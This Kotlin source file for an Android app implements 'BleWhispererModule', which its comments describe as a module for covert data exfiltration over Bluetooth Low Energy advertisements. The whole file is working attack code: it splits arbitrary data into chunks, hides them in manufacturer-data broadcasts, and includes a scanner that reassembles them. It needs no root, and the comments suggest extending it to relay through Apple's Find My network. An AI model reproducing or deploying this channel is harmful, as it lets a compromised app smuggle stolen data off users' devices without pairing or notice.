package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.bluetooth.le.BluetoothLeScanner
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanFilter
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.flow.flow
import java.nio.ByteBuffer
import java.util.concurrent.ConcurrentHashMap
import java.util.zip.CRC32
import kotlin.coroutines.cancellation.CancellationException

/**
 * Operating mode for the BLEWhisperer covert data exfiltration module.
 */
enum class WhispererMode {
    /** Embed arbitrary data into BLE advertisement manufacturer data payloads. */
    TRANSMIT,
    /** Scan for advertisements matching the exfiltration pattern and reassemble data. */
    RECEIVE
}

/**
 * Module for covert data exfiltration via BLE advertisements.
 *
 * This attack uses BLE advertisement packets as a covert data channel. A compromised
 * app embeds stolen data in advertisement payloads; a nearby receiver collects the
 * data without pairing. The technique can be extended to exploit Apple's Find My
 * network for relay over longer distances.
 *
 * This module does NOT require root -- it uses the standard Android
 * [BluetoothLeAdvertiser] and [BluetoothLeScanner] APIs (userspace).
 *
 * **TRANSMIT mode**: Takes arbitrary string data, encodes it into BLE advertisement
 * manufacturer data payloads, and cycles through chunks using the BluetoothLeAdvertiser API.
 *
 * **RECEIVE mode**: Scans for advertisements matching the exfiltration pattern,
 * reassembles chunked data, and emits decoded content.
 *
 * @property context The application context, required to access system Bluetooth services.
 */
class BleWhispererModule(private val context: Context) {

    companion object {
        private const val TAG = "BleWhisperer"

        /**
         * Custom manufacturer ID used for the exfiltration channel.
         * 0xFFFF is reserved for testing by the Bluetooth SIG and will not
         * collide with legitimate manufacturer advertisements.
         */
        private const val WHISPER_MANUFACTURER_ID = 0xFFFF

        /**
         * Magic bytes that identify a Whisperer advertisement payload.
         * The receiver uses these to filter out unrelated advertisements.
         */
        private val WHISPER_MAGIC = byteArrayOf(0x57, 0x48) // "WH"

        /**
         * Maximum bytes of user data per advertisement chunk.
         * BLE advertisement manufacturer data is limited to ~24 bytes total.
         * Layout per chunk:
         *   [2 magic] [1 session] [1 seq] [1 total] [4 CRC32] [up to 15 data bytes]
         * Total overhead = 9 bytes, leaving 15 bytes for data in a 24-byte payload.
         */
        private const val HEADER_SIZE = 9
        private const val MAX_CHUNK_DATA = 15
        private const val MAX_PAYLOAD_SIZE = HEADER_SIZE + MAX_CHUNK_DATA

        /** Duration to advertise each chunk before rotating (ms). */
        private const val CHUNK_ADVERTISE_DURATION_MS = 200L

        /** Gap between chunks to avoid congestion (ms). */
        private const val CHUNK_GAP_MS = 50L

        /** Number of times to cycle through all chunks for reliability. */
        private const val TRANSMIT_CYCLES = 3
    }

    // Access the system Bluetooth Adapter.
    private val bluetoothAdapter: BluetoothAdapter? =
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter

    // The advertiser object handles broadcasting packets.
    private var advertiser: BluetoothLeAdvertiser? = bluetoothAdapter?.bluetoothLeAdvertiser

    // The scanner object handles receiving advertisements.
    private var scanner: BluetoothLeScanner? = bluetoothAdapter?.bluetoothLeScanner

    // Coroutine scope for background work.
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Job references for cancellation.
    private var transmitJob: Job? = null
    private var receiveJob: Job? = null

    /**
     * Computes CRC32 over the given byte array.
     *
     * @param data The bytes to checksum.
     * @return The CRC32 value as a 4-byte array (big-endian).
     */
    private fun computeCrc32(data: ByteArray): ByteArray {
        val crc = CRC32()
        crc.update(data)
        val value = crc.value
        return ByteBuffer.allocate(4).putInt(value.toInt()).array()
    }

    /**
     * Splits the input string into advertisement-sized chunks with headers.
     *
     * Each chunk has the format:
     *   [2 magic][1 sessionId][1 seqNumber][1 totalChunks][4 CRC32][N dataBytes]
     *
     * @param data The string to encode.
     * @param sessionId A random session byte to group chunks from the same transmission.
     * @return A list of raw byte arrays, each suitable for manufacturer data.
     */
    private fun chunkData(data: String, sessionId: Byte): List<ByteArray> {
        val dataBytes = data.toByteArray(Charsets.UTF_8)
        val chunks = dataBytes.toList().chunked(MAX_CHUNK_DATA)
        val totalChunks = chunks.size.coerceAtMost(255)

        return chunks.mapIndexed { index, chunkBytes ->
            val chunkArray = chunkBytes.toByteArray()
            val crc = computeCrc32(chunkArray)

            val payload = ByteArray(HEADER_SIZE + chunkArray.size)
            // Magic bytes
            payload[0] = WHISPER_MAGIC[0]
            payload[1] = WHISPER_MAGIC[1]
            // Session ID
            payload[2] = sessionId
            // Sequence number
            payload[3] = index.toByte()
            // Total chunks
            payload[4] = totalChunks.toByte()
            // CRC32 (4 bytes)
            System.arraycopy(crc, 0, payload, 5, 4)
            // Data
            System.arraycopy(chunkArray, 0, payload, HEADER_SIZE, chunkArray.size)

            payload
        }
    }

    /**
     * Starts transmitting data embedded in BLE advertisement payloads.
     *
     * The data is chunked, each chunk is broadcast as manufacturer-specific data
     * in a BLE advertisement, and the full set is cycled [TRANSMIT_CYCLES] times
     * for reliability.
     *
     * @param data The arbitrary string data to exfiltrate.
     * @return A Flow emitting progress log messages.
     */
    @SuppressLint("MissingPermission")
    fun startTransmit(data: String): Flow<String> = flow {
        emit("Initializing BLEWhisperer in TRANSMIT mode...")

        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            emit("ERROR: Bluetooth not enabled.")
            return@flow
        }

        advertiser = bluetoothAdapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            emit("ERROR: BLE Advertiser not available on this device.")
            return@flow
        }

        if (data.isEmpty()) {
            emit("ERROR: No data provided for transmission.")
            return@flow
        }

        val dataBytes = data.toByteArray(Charsets.UTF_8)
        emit("Data size: ${dataBytes.size} bytes")

        if (dataBytes.size > MAX_CHUNK_DATA * 255) {
            emit("ERROR: Data exceeds maximum size (${MAX_CHUNK_DATA * 255} bytes).")
            return@flow
        }

        // Generate a random session ID to group chunks.
        val sessionId = (System.currentTimeMillis() and 0xFF).toByte()
        val chunks = chunkData(data, sessionId)
        emit("Split into ${chunks.size} chunk(s), session ID: 0x${String.format("%02X", sessionId)}")

        // Cycle through all chunks multiple times for reliability.
        for (cycle in 1..TRANSMIT_CYCLES) {
            emit("--- Transmit cycle $cycle/$TRANSMIT_CYCLES ---")
            chunks.forEachIndexed { index, chunkPayload ->

                val settings = AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .setConnectable(false)
                    .build()

                val advertiseData = AdvertiseData.Builder()
                    .setIncludeDeviceName(false)
                    .setIncludeTxPowerLevel(false)
                    .addManufacturerData(WHISPER_MANUFACTURER_ID, chunkPayload)
                    .build()

                val callback = object : AdvertiseCallback() {
                    override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                        Log.d(TAG, "Chunk $index advertise started")
                    }

                    override fun onStartFailure(errorCode: Int) {
                        Log.e(TAG, "Chunk $index advertise failed: $errorCode")
                    }
                }

                try {
                    advertiser?.startAdvertising(settings, advertiseData, callback)
                    emit("TX chunk ${index + 1}/${chunks.size} (${chunkPayload.size - HEADER_SIZE} bytes)")
                    delay(CHUNK_ADVERTISE_DURATION_MS)
                    advertiser?.stopAdvertising(callback)
                    delay(CHUNK_GAP_MS)
                } catch (e: Exception) {
                    if (e is CancellationException) throw e
                    Log.e(TAG, "Error transmitting chunk $index", e)
                    emit("ERROR transmitting chunk ${index + 1}: ${e.message}")
                }
            }
        }

        emit("")
        emit("=== Transmission Complete ===")
        emit("Sent ${chunks.size} chunk(s) x $TRANSMIT_CYCLES cycles")
        emit("Total payload: ${dataBytes.size} bytes")
    }

    /**
     * Starts receiving and reassembling exfiltrated data from BLE advertisements.
     *
     * Scans for advertisements carrying Whisperer-formatted manufacturer data,
     * reassembles chunks by session ID and sequence number, verifies CRC32 integrity,
     * and emits the decoded data.
     *
     * @return A Flow emitting progress log messages and decoded data.
     */
    @SuppressLint("MissingPermission")
    fun startReceive(): Flow<String> = callbackFlow {
        trySend("Initializing BLEWhisperer in RECEIVE mode...")

        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            trySend("ERROR: Bluetooth not enabled.")
            close()
            return@callbackFlow
        }

        scanner = bluetoothAdapter.bluetoothLeScanner
        if (scanner == null) {
            trySend("ERROR: BLE Scanner not available on this device.")
            close()
            return@callbackFlow
        }

        trySend("Scanning for Whisperer advertisements...")
        trySend("Manufacturer ID: 0x${String.format("%04X", WHISPER_MANUFACTURER_ID)}, Magic: 0x${
            WHISPER_MAGIC.joinToString("") { String.format("%02X", it) }
        }")

        // Storage for reassembly: sessionId -> (seqNumber -> dataBytes)
        val sessions = ConcurrentHashMap<Byte, ConcurrentHashMap<Int, ByteArray>>()
        // Track expected total chunks per session.
        val sessionTotals = ConcurrentHashMap<Byte, Int>()
        // Track already-completed sessions to avoid duplicate reassembly.
        val completedSessions = ConcurrentHashMap.newKeySet<Byte>()

        val scanCallback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult?) {
                result ?: return
                val record = result.scanRecord ?: return

                // Check for our manufacturer data.
                val mfrData = record.getManufacturerSpecificData(WHISPER_MANUFACTURER_ID)
                    ?: return

                // Verify minimum size and magic bytes.
                if (mfrData.size < HEADER_SIZE) return
                if (mfrData[0] != WHISPER_MAGIC[0] || mfrData[1] != WHISPER_MAGIC[1]) return

                val sessionId = mfrData[2]
                val seqNumber = mfrData[3].toInt() and 0xFF
                val totalChunks = mfrData[4].toInt() and 0xFF

                // Extract CRC and data.
                val expectedCrc = mfrData.copyOfRange(5, 9)
                val chunkData = mfrData.copyOfRange(HEADER_SIZE, mfrData.size)

                // Verify CRC32.
                val actualCrc = computeCrc32(chunkData)
                if (!expectedCrc.contentEquals(actualCrc)) {
                    trySend("RX chunk ${seqNumber + 1}/$totalChunks -- CRC MISMATCH, discarding")
                    return
                }

                // Skip if this session is already completed.
                if (completedSessions.contains(sessionId)) return

                trySend("RX chunk ${seqNumber + 1}/$totalChunks (session 0x${
                    String.format("%02X", sessionId)
                }, ${chunkData.size} bytes)")

                // Store the chunk.
                val sessionChunks = sessions.getOrPut(sessionId) { ConcurrentHashMap() }
                sessionChunks[seqNumber] = chunkData
                sessionTotals[sessionId] = totalChunks

                // Check if all chunks for this session have been received.
                if (sessionChunks.size >= totalChunks) {
                    completedSessions.add(sessionId)

                    // Reassemble in order.
                    val reassembled = ByteArray(
                        (0 until totalChunks).sumOf { sessionChunks[it]?.size ?: 0 }
                    )
                    var offset = 0
                    for (i in 0 until totalChunks) {
                        val chunk = sessionChunks[i]
                        if (chunk != null) {
                            System.arraycopy(chunk, 0, reassembled, offset, chunk.size)
                            offset += chunk.size
                        }
                    }

                    val decoded = String(reassembled, Charsets.UTF_8)
                    trySend("")
                    trySend("=== Data Reassembled ===")
                    trySend("Session: 0x${String.format("%02X", sessionId)}")
                    trySend("Chunks: $totalChunks")
                    trySend("Total size: ${reassembled.size} bytes")
                    trySend("Decoded data:")
                    trySend(decoded)
                    trySend("========================")

                    // Clean up session data.
                    sessions.remove(sessionId)
                    sessionTotals.remove(sessionId)
                }
            }

            override fun onScanFailed(errorCode: Int) {
                val message = when (errorCode) {
                    SCAN_FAILED_ALREADY_STARTED -> "Scan failed: already started"
                    SCAN_FAILED_APPLICATION_REGISTRATION_FAILED -> "Scan failed: app registration failed"
                    SCAN_FAILED_INTERNAL_ERROR -> "Scan failed: internal error"
                    SCAN_FAILED_FEATURE_UNSUPPORTED -> "Scan failed: feature unsupported"
                    else -> "Scan failed: error code $errorCode"
                }
                Log.e(TAG, message)
                trySend("ERROR: $message")
            }
        }

        // Configure scan settings for low latency.
        val scanSettings = ScanSettings.Builder()
            .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
            .setReportDelay(0)
            .build()

        // No scan filters -- we filter manually in the callback by manufacturer data.
        scanner?.startScan(emptyList<ScanFilter>(), scanSettings, scanCallback)
        trySend("BLE scan started. Listening for exfiltrated data...")

        awaitClose {
            try {
                scanner?.stopScan(scanCallback)
                Log.d(TAG, "BLE scan stopped")
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping scan", e)
            }
        }
    }

    /**
     * Stops any active transmit or receive operation.
     */
    @SuppressLint("MissingPermission")
    fun stop() {
        transmitJob?.cancel()
        transmitJob = null
        receiveJob?.cancel()
        receiveJob = null
    }

    /**
     * Stops all operations and releases resources.
     */
    fun close() {
        stop()
        scope.cancel()
    }
}
